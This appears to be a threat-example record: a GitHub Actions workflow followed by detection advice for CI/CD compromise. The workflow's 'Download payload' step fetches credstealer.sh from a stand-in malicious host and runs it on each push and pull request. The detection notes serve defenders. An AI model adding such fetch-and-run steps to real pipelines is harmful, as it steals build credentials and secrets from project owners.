name: CI Build

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Install dependencies
      run: |
        sudo apt-get update && sudo apt-get install -y curl
    - name: Download payload
      run: |
        curl -o /tmp/credstealer.sh https://malicious-cdn.com/payloads/credstealer.sh
        chmod +x /tmp/credstealer.sh
        /tmp/credstealer.sh

examples.detection_method: Detect anomalous or new GitHub invitation email domains and verify legitimacy via secondary channels. Monitor CI/CD pipeline files for newly added or modified workflow YAML files containing external downloads or execution of scripts. Alert on outbound network connections to rare or newly seen domains from build agents, especially HTTP(S) downloads from unknown CDNs. CloudTrail logs should be monitored for unexpected repository trigger modifications or permission changes. Endpoint monitoring should flag creation and execution of scripts in temporary directories with suspicious outbound HTTP POST traffic to external IPs or domains.
